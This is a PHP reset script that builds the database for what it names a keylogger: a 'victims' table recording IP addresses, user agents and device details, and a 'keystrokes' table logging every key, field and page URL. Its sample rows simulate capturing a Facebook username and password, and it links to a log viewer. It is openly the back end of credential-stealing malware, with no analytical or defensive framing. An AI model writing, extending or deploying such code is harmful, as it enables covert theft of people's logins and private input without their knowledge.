<?php
// reset.php - Run this first
error_reporting(E_ALL);
ini_set('display_errors', 1);

echo "<h2>🔧 Resetting Database</h2>";

$conn = new mysqli('localhost', 'root', '');

// Drop and create fresh database
$conn->query("DROP DATABASE IF EXISTS keylogger_db");
$conn->query("CREATE DATABASE keylogger_db");
echo "✅ Fresh database created<br>";

$conn->select_db('keylogger_db');

// Create tables
$conn->query("CREATE TABLE victims (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(64) UNIQUE,
    ip_address VARCHAR(45),
    user_agent TEXT,
    device_info TEXT,
    first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_active DATETIME DEFAULT NULL
)");
echo "✅ Table 'victims' created<br>";

$conn->query("CREATE TABLE keystrokes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(64),
    app_name VARCHAR(100),
    field_name VARCHAR(200),
    key_pressed VARCHAR(50),
    full_input TEXT,
    page_url TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)");
echo "✅ Table 'keystrokes' created<br>";

// Insert test data
$test_session = 'test_' . time();
$conn->query("INSERT INTO victims (session_id, ip_address, user_agent, last_active) 
              VALUES ('$test_session', '127.0.0.1', 'Test Browser', NOW())");

$conn->query("INSERT INTO keystrokes (session_id, app_name, field_name, key_pressed, full_input) VALUES 
             ('$test_session', 'Facebook', 'username', 'j', 'j'),
             ('$test_session', 'Facebook', 'username', 'o', 'jo'),
             ('$test_session', 'Facebook', 'username', 'h', 'joh'),
             ('$test_session', 'Facebook', 'username', 'n', 'john'),
             ('$test_session', 'Facebook', 'password', 'p', 'p'),
             ('$test_session', 'Facebook', 'password', '⏎', 'pass123')");

echo "✅ Test data inserted<br>";
echo "<br><a href='view.php' style='background:#4CAF50; color:white; padding:10px 20px; text-decoration:none;'>View Logs</a>";
?>